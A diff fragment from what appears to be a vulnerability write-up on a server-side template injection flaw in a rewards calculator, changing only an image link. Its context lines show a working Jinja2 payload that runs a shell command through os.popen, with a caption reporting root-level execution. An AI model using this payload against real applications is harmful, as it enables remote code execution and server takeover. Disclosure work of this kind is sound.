@@ -81,7 +81,7 @@ The rewards calculator feature contains a severe Server-Side Template Injection 
     expression={{cycler.__init__.__globals__.os.popen('id').read()}}
     ```
 
-    ![Bug 12 - Image 5](https://draft.blogger.com/blog/post/edit/2732339459271235026/6460157345475306947#)
+    ![Bug 12 - Image 5](https://blogger.googleusercontent.com/img/a/AVvXsEh5tAOvdEvTGVdFjit_xHlSUjn40NihZh_oLiwliybrxWkXWJV-KCe6hCSMB__eEdXaof7vISpGaXHyqYgHTIPk2k39nGh9eKftNO2KUVcH5vy4gIVd9EG2tZ0HUXpI5RIuazChbo8Ml4YukMC783VPfPQLwqqvqpOXQIi9RK3XM5TEAuZHevdVlUIWXVg)
     *RCE payload execution showing uid=0(root), gid=0(root), groups=0(root)*
 
 12. Execute arbitrary commands to fully compromise the server
